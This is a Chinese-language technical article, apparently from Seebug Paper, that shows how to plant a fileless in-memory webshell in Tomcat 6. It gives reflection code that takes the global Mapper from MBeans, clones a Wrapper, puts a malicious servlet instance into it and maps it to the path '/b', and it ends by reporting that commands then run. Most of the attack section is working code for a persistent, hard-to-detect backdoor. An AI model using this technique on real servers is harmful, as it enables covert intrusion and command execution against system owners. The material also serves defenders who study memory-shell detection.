**作者：宽字节安全**  
**原文链接：**  
**本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！**  
**投稿邮箱：PI:EMAIL**
前几篇文章主要介绍了在tomcat，weblogic下如何通过动态注册一个Filter的方式，去实现无文件落地的webshell。当然在J2EE中，我们也可以动态注册一个Servlet去实现无文件落地的webshell。
**以下分析基于tomcat6，其他版本的Tomcat的思路类似**
## 0x00 servlet简介
### 1\. Servlet 是什么？
Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP
服务器上的数据库或应用程序之间的中间层。使用 Servlet，您可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。Java
Servlet 通常情况下与使用 CGI（Common Gateway Interface，公共网关接口）实现的程序可以达到异曲同工的效果。但是相比于
CGI，Servlet 有以下几点优势：
  * 性能明显更好。
  * Servlet 在 Web 服务器的地址空间内执行。这样它就没有必要再创建一个单独的进程来处理每个客户端请求。
  * Servlet 是独立于平台的，因为它们是用 Java 编写的。服务器上的 Java 安全管理器执行了一系列限制，以保护服务器计算机上的资源。因此，Servlet 是可信的。
  * Java 类库的全部功能对 Servlet 来说都是可用的。它可以通过 sockets 和 RMI 机制与 applets、数据库或其他软件进行交互。
### 2\. Servlet 架构
下图显示了 Servlet 在 Web 应用程序中的位置。
## 0x01 Tomcat响应servlet的流程
在org.apache.catalina.core.StandardContextValve#invoke中，简化后的代码如下
                    Wrapper wrapper = request.getWrapper();
                    Object[] instances = this.context.getApplicationEventListeners();
                    ServletRequestEvent event = null;
                    int i;
                    ServletRequestListener listener;
                    HttpServletRequest sreq;
                    if (instances != null && instances.length > 0) {
                        event = new ServletRequestEvent(((StandardContext)this.container).getServletContext(), request.getRequest());
                        for(i = 0; i  **注意 我这里为了截图，直接从pageContext中截图，但是实际是不可以的，一定是全局context**
>
>
> 
#### 1.2 MBean中
这种就比较简单，在tomcat的MBean中，存储全局Mapper对象。我们可以从MBean中获取Mapper，然后添加我们自己的url与servlet的映射关系即可。代码如下。注意，在服务器上运行，能反射就反射，因为肯定没有相关的package。
            Method getRegistryM = Class.forName("org.apache.tomcat.util.modeler.Registry").getMethod("getRegistry", Object.class, Object.class);
            Object RegistryO = getRegistryM.invoke(null, null, null);
            Method getMBeanServerM = RegistryO.getClass().getMethod("getMBeanServer");
            Object mbeanServer = getMBeanServerM.invoke(RegistryO);
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mbeanServer);
            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            obj = field.get(obj);
            field = Class.forName("com.sun.jmx.mbeanserver.Repository").getDeclaredField("domainTb");
            field.setAccessible(true);
            HashMap obj2 = (HashMap) field.get(obj);
            obj = ((HashMap) obj2.get("Catalina")).get("port=8080,type=Mapper");
            field = Class.forName("com.sun.jmx.mbeanserver.NamedObject").getDeclaredField("object");
            field.setAccessible(true);
            obj = field.get(obj);
            field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
            field.setAccessible(true);
            Object Mapper = field.get(obj);
### 2\. 向Mapper中添加wrapper
幸运的是，Mapper中有相关方法，可以直接添加一个wrapper。其中第一个参数为url，第二个为url请求相对应的wrapper
    org.apache.tomcat.util.http.mapper.Mapper#addWrapper(org.apache.tomcat.util.http.mapper.Mapper.Context, java.lang.String, java.lang.Object)
    protected void addWrapper(Mapper.Context context, String path, Object wrapper) {
        this.addWrapper(context, path, wrapper, false);
    }
通过反射调用的代码如下
    Method addWrapperF = Mapper.getClass().getDeclaredMethod("addWrapper", 
    context.getClass(), String.class, Object.class);addWrapperF.setAccessible(true);
    addWrapperF.invoke(Mapper, context, "/b", wrapperTest);
### 3\. 如何生成一个Wrapper对象
在这里直接实例化Wrapper是不可以用的。所以我们需要想办法创建一个属于我们自己的wrapper对象。但是wrapper对象中参数过于复杂，为了不影响其他servlet的请求过程，深拷贝一个先有的wrapper对象，并修改响应ServletName是最简单的办法。但是wrapper对象没有实现clone方法。所以在这里我自己通过递归写了一个深拷贝对象的方法，代码如下
        public Object CopyObject(Object src, Object dst, Class srcClass) throws Exception {
            // 只考虑本项目中使用，恰好src对象只能通过无参构造函数去实例化
            if (dst == null) {
                dst = src.getClass().newInstance();
            }
            if (srcClass.getName().equals("java.lang.Object")) {
                return dst;
            }
            Field[] fields = srcClass.getDeclaredFields();
            for (Field f : fields) {
                if (java.lang.reflect.Modifier.isStatic(f.getModifiers())) {
                    // 如果是静态的变量，在这里不复制，直接跳过
                    continue;
                }
                if (java.lang.reflect.Modifier.isFinal(f.getModifiers())) {
                    // 如果是final的变量，在这里不复制，直接跳过
                    continue;
                }
                // 如果该字段不为public，则设置为public访问
                if (!f.isAccessible()) {
                    f.setAccessible(true);
                }
                f.set(dst, f.get(src));
            }
            return CopyObject(src, dst, srcClass.getSuperclass());
        }
拷贝对象后，我们再修改相关参数即可。
            Object wrapperTest = CopyObject(wrapperObject, null, wrapperObject.getClass());
            Method addMappingM = wrapperTest.getClass().getDeclaredMethod("addMapping", String.class);
            addMappingM.invoke(wrapperTest, "/b");
### 4\. Wrapper中servlet加载机制
在tomcat随后的请求中，会通过调用org.apache.catalina.core.StandardWrapperValve#invoke，获取Wrapper中对应的servlet。并调用，代码如下
        public final void invoke(Request request, Response response) throws IOException, ServletException {
            boolean unavailable = false;
            Throwable throwable = null;
            long t1 = System.currentTimeMillis();
            ++this.requestCount;
            StandardWrapper wrapper = (StandardWrapper)this.getContainer();
            Servlet servlet = null;
            Context context = (Context)wrapper.getParent();
            try {
                if (!unavailable) {
                    servlet = wrapper.allocate();
                }
下面我们主要分析一下`wrapper.allocate()`的代码
        public Servlet allocate() throws ServletException {
                if (!this.singleThreadModel) {
                    if (this.instance == null) {
                        synchronized(this) {
                            if (this.instance == null) 
                                    this.instance = this.loadServlet();
                            }
                        }
                    }
        public synchronized Servlet loadServlet() throws ServletException {
                    actualClass = jspWrapper.getServletClass();
                    ClassLoader classLoader = loader.getClassLoader();
                    Class classClass = null;
            if (classLoader != null) {
                            classClass = classLoader.loadClass(actualClass);
                        } else {
                            classClass = Class.forName(actualClass);
                        }
如果不存在instance，则通过loadServlet去查找对应的class并实例化。所以，我们直接修改wrapper的instance字段为实例化后的servlet即可。
            Field instanceF = wrapperTest.getClass().getDeclaredField("instance");
            instanceF.setAccessible(true);
            instanceF.set(wrapperTest, evilFilterClass.newInstance());
以上问题全部解决后，调用addWrapper添加即可完成
    addWrapperF.invoke(Mapper, context, "/b", wrapperTest);
## 0x03 成果检验
访问b 提示404
执行成功后，可以正常执行命令
* * *